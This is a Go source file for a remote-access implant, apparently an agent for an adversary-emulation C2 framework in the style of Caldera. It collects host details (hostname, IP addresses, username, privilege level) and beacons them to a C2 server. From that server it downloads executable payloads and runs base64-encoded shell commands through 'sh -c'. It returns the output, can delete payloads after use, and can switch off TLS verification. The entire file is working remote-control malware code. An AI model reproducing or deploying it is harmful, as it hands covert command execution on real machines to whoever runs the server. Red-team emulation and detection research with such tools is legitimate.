package main

import (
    "bytes"
    "context"
    "crypto/tls"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "syscall"
    "time"
)

var debug = os.Getenv("CG_DEBUG") == "1"

func dprintf(format string, a ...interface{}) {
    if debug {
        fmt.Printf(format+"\n", a...)
    }
}

type Instruction struct {
    ID            string   `json:"id"`
    Sleep         int      `json:"sleep"`
    Command       string   `json:"command"`
    Executor      string   `json:"executor"`
    Timeout       int      `json:"timeout"`
    Payloads      []string `json:"payloads"`
    Uploads       []string `json:"uploads"`
    Deadman       bool     `json:"deadman"`
    DeletePayload bool     `json:"delete_payload"`
}

type BeaconResponse struct {
    Paw          string        `json:"paw"`
    Sleep        int           `json:"sleep"`
    Watchdog     int           `json:"watchdog"`
    Instructions []Instruction `json:"instructions"`
}

type ExecutionResult struct {
    ID       string `json:"id"`
    Output   string `json:"output"`
    Stderr   string `json:"stderr"`
    ExitCode int    `json:"exit_code"`
    Status   int    `json:"status"`
    PID      int    `json:"pid"`
}

type BeaconResult struct {
    Paw     string            `json:"paw"`
    Results []ExecutionResult `json:"results"`
}

var insecureTLS = false

func parseInstructions(raw interface{}) ([]Instruction, error) {
    var list []Instruction

    rawStr, ok := raw.(string)
    if !ok {
        return nil, fmt.Errorf("instructions field is not a string")
    }

    var jsonStrings []string
    if err := json.Unmarshal([]byte(rawStr), &jsonStrings); err != nil {
        return nil, fmt.Errorf("nested unmarshal failed: %v", err)
    }

    for _, s := range jsonStrings {
        var inst Instruction
        if err := json.Unmarshal([]byte(s), &inst); err != nil {
            fmt.Println("[ERROR] could not unmarshal instruction:", err)
            continue
        }
        list = append(list, inst)
    }
    return list, nil
}

func getHTTPClient() *http.Client {
    if insecureTLS {
        return &http.Client{
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            },
        }
    }
    return &http.Client{}
}

func sendBeacon(server string, data map[string]interface{}) (*BeaconResponse, error) {
    jsonData, _ := json.Marshal(data)
    encoded := base64.StdEncoding.EncodeToString(jsonData)

    client := getHTTPClient()
    resp, err := client.Post(server+"/beacon", "text/plain", bytes.NewBuffer([]byte(encoded)))
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return nil, fmt.Errorf("unexpected HTTP status: %d", resp.StatusCode)
    }

    body, _ := io.ReadAll(resp.Body)
    if len(body) == 0 {
        return nil, fmt.Errorf("empty body from server")
    }

    decoded, err := base64.StdEncoding.DecodeString(string(body))
    if err != nil {
        return nil, fmt.Errorf("base64 decode failed: %v", err)
    }

    dprintf("[DEBUG] Server response: %s", string(decoded))

    var raw map[string]interface{}
    if err := json.Unmarshal(decoded, &raw); err != nil {
        return nil, fmt.Errorf("json unmarshal failed: %v", err)
    }

    var br BeaconResponse
    br.Paw = raw["paw"].(string)
    br.Sleep = int(raw["sleep"].(float64))
    br.Watchdog = int(raw["watchdog"].(float64))

    instructions, err := parseInstructions(raw["instructions"])
    if err != nil {
        return nil, err
    }
    br.Instructions = instructions

    return &br, nil
}

func downloadPayload(server, name string) error {
    url := server + "/file/download"
    req, err := http.NewRequest("POST", url, nil)
    if err != nil {
        return err
    }
    req.Header.Set("file", name)

    client := getHTTPClient()
    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return fmt.Errorf("payload download HTTP %d", resp.StatusCode)
    }

    data, err := io.ReadAll(resp.Body)
    if err != nil {
        return err
    }
    if err := os.WriteFile(name, data, 0755); err != nil {
        return err
    }
    dprintf("[DEBUG] Payload saved: %s (%d bytes)", name, len(data))
    return nil
}

func runInstruction(inst Instruction) ExecutionResult {
    out := ExecutionResult{ID: inst.ID}

    cmdBytes, err := base64.StdEncoding.DecodeString(inst.Command)
    if err != nil {
        out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
        out.ExitCode = 1
        return out
    }

    dprintf("[DEBUG] Exec: %s", string(cmdBytes))

    ctx := context.Background()
    var cancel context.CancelFunc
    if inst.Timeout > 0 {
        ctx, cancel = context.WithTimeout(ctx, time.Duration(inst.Timeout)*time.Second)
    } else {
        ctx, cancel = context.WithCancel(ctx)
    }
    defer cancel()

    cmd := exec.CommandContext(ctx, "sh", "-c", string(cmdBytes))
    cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}

    var stdoutBuf, stderrBuf bytes.Buffer
    cmd.Stdout = &stdoutBuf
    cmd.Stderr = &stderrBuf

    if err := cmd.Start(); err != nil {
        out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
        out.ExitCode = 1
        return out
    }

    waitErr := cmd.Wait()

    blocked := 0
    exitCode := 0

    if waitErr != nil {
        if ctx.Err() == context.DeadlineExceeded {
            exitCode = 124
        } else if exitErr, ok := waitErr.(*exec.ExitError); ok {
            ws := exitErr.Sys().(syscall.WaitStatus)
            if ws.Signaled() {
                if ws.Signal() == syscall.SIGKILL {
                    blocked = 1
                }
                exitCode = 128 + int(ws.Signal())
            } else {
                exitCode = ws.ExitStatus()
            }
        } else {
            blocked = 1
            exitCode = 1
        }
    }

    out.Output = base64.StdEncoding.EncodeToString(stdoutBuf.Bytes())
    out.Stderr = base64.StdEncoding.EncodeToString(stderrBuf.Bytes())
    out.ExitCode = exitCode
    out.Status = blocked
    if cmd.ProcessState != nil {
        out.PID = cmd.ProcessState.Pid()
    }

    dprintf("[DEBUG] PID %d exit=%d blocked=%d", out.PID, out.ExitCode, out.Status)

    return out
}

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage:", os.Args[0], "<C2 URL> [-insecure]")
        os.Exit(1)
    }

    server := os.Args[1]
    if len(os.Args) > 2 && strings.ToLower(os.Args[2]) == "-insecure" {
        insecureTLS = true
        fmt.Println("[WARN] TLS certificate verification is disabled")
    }

    hostname, _ := os.Hostname()
    var ipList []string
    ifaces, _ := net.Interfaces()
    for _, iface := range ifaces {
        if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
            continue
        }
        addrs, _ := iface.Addrs()
        for _, addr := range addrs {
            var ip net.IP
            switch v := addr.(type) {
            case *net.IPNet:
                ip = v.IP
            case *net.IPAddr:
                ip = v.IP
            }
            if ip == nil || ip.IsLoopback() {
                continue
            }
            if ipv4 := ip.To4(); ipv4 != nil {
                ipList = append(ipList, ipv4.String())
            }
        }
    }

    hostField := hostname
    displayName := hostname

    privilege := "User"
    if os.Geteuid() == 0 {
        privilege = "Elevated"
    }

    agent := map[string]interface{}{
        "platform":        runtime.GOOS,
        "host":            hostField,
        "display_name":    displayName,
        "group":           "red",
        "username":        os.Getenv("USER"),
        "architecture":    runtime.GOARCH,
        "executors":       []string{"sh"},
        "privilege":       privilege,
        "pid":             os.Getpid(),
        "ppid":            os.Getppid(),
        "location":        os.Args[0],
        "exe_name":        os.Args[0],
        "host_ip_addrs":   ipList,
        "deadman_enabled": true,
    }

    for {
        resp, err := sendBeacon(server, agent)
        if err != nil {
            fmt.Println("[ERROR] beacon:", err)
            time.Sleep(10 * time.Second)
            continue
        }
        dprintf("[DEBUG] Beacon OK – paw=%s, tasks=%d", resp.Paw, len(resp.Instructions))

        agent["paw"] = resp.Paw

        var results []ExecutionResult

        for _, inst := range resp.Instructions {
            for _, p := range inst.Payloads {
                if err := downloadPayload(server, p); err != nil {
                    fmt.Println("[ERROR] payload:", err)
                }
            }

            res := runInstruction(inst)
            results = append(results, res)

            if inst.DeletePayload {
                for _, p := range inst.Payloads {
                    if err := os.Remove(p); err == nil {
                        dprintf("[DEBUG] Payload removed: %s", p)
                    }
                }
            }
        }

        if len(results) > 0 {
            jsonResults, _ := json.Marshal(BeaconResult{Paw: resp.Paw, Results: results})
            encoded := base64.StdEncoding.EncodeToString(jsonResults)
            client := getHTTPClient()
            if _, err := client.Post(server+"/beacon", "text/plain", bytes.NewBuffer([]byte(encoded))); err != nil {
                fmt.Println("[ERROR] send results:", err)
            } else {
                dprintf("[DEBUG] Results sent (%d)", len(results))
            }
        }

        time.Sleep(time.Duration(resp.Sleep) * time.Second)
    }
}
